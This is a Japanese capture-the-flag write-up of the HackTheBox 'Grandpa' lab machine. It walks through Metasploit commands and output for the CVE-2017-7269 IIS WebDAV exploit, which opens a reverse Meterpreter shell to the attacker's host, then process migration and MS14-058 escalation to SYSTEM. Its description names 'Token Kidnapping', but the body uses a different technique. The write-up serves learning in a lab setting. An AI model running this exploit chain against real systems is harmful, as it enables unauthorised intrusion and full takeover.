+++
title = "HackTheBox - Grandpa Writeup"
date = "2026-04-12"
description = "IIS 6.0 WebDAV の RCE から Token Kidnapping で SYSTEM 奪取"
tags = ["HackTheBox", "CTF", "Windows", "CVE-2017-7269", "Metasploit", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Grandpa |
| OS | Windows Server 2003 R2 SP2 x86 |
| IP | 10.129.95.233 |
| Difficulty | Easy |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.95.233
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

ポート 80 のみ開放。**Microsoft IIS 6.0** が稼働している。  
IIS 6.0 + WebDAV の組み合わせで既知の RCE 脆弱性 **CVE-2017-7269** が存在する。

---

## Initial Access — CVE-2017-7269 (WebDAV RCE)

Metasploit でエクスプロイトを検索・選択する。

```bash
msf > search cve:2017-7269
msf > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST tun0
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.129.95.233
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
```

```text
[*] Started reverse TCP handler on 10.10.16.166:4444
[*] Trying path length 3 to 60 ...
[*] Sending stage (196678 bytes) to 10.129.95.233
[*] Meterpreter session 1 opened (10.10.16.166:4444 -> 10.129.95.233:1030)

[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

セッションは取得できたが、`getuid` が失敗している。シェルが不安定な状態のためマイグレーションが必要。

---

## Process Migration

プロセス一覧を確認し、安定したプロセスへ移行する。

```bash
meterpreter > ps
```

```text
 PID   PPID  Name               Arch  Session  User                          Path
 1924  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2248  1512  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3916  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
```

`wmiprvse.exe`（PID: 1924）は常駐システムサービスで安定しているため、マイグレーション先として選択。

```bash
meterpreter > migrate 1924
```

```text
[*] Migrating from 1348 to 1924...
[*] Migration completed successfully.
```

## Foothold

```bash
meterpreter > getuid
```

```text
Server username: NT AUTHORITY\NETWORK SERVICE
```

---

## Post Exploitation — Local Exploit Suggester

```bash
meterpreter > background
msf > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set session 1
msf post(multi/recon/local_exploit_suggester) > run
```

---

## Results

```text
[+] exploit/windows/local/ms10_015_kitrap0d          Yes  The service is running, but could not be validated.
[+] exploit/windows/local/ms14_058_track_popup_menu  Yes  The target appears to be vulnerable.
[+] exploit/windows/local/ms14_070_tcpip_ioctl       Yes  The target appears to be vulnerable.
[+] exploit/windows/local/ms15_051_client_copy_image Yes  The target appears to be vulnerable.
[+] exploit/windows/local/ms16_075_reflection        Yes  The target appears to be vulnerable.
```

---

## Privilege Escalation — MS14-058

**ms14_058_track_popup_menu** を使用する。

```bash
msf > use exploit/windows/local/ms14_058_track_popup_menu
msf exploit(ms14_058_track_popup_menu) > set SESSION 1
msf exploit(ms14_058_track_popup_menu) > set LHOST tun0
msf exploit(ms14_058_track_popup_menu) > run
```

---

## SYSTEM Shell

```bash
meterpreter > getuid
```

```text
Server username: NT AUTHORITY\SYSTEM
```

---

## Flags

### User

```bash
meterpreter > search -f user.txt
meterpreter > cat "c:\Documents and Settings\Harry\Desktop\user.txt"
```

```text
Path: c:\Documents and Settings\Harry\Desktop\user.txt
```

### Root

```bash
meterpreter > search -f root.txt
meterpreter > cat "c:\Documents and Settings\Administrator\Desktop\root.txt"
```

```text
Path: c:\Documents and Settings\Administrator\Desktop\root.txt
```

---

## Summary

CVE-2017-7269 (IIS 6.0 WebDAV RCE) で初期侵入 → `wmiprvse.exe` へマイグレーションしてシェルを安定化 → MS14-058 で `NT AUTHORITY\SYSTEM` 奪取
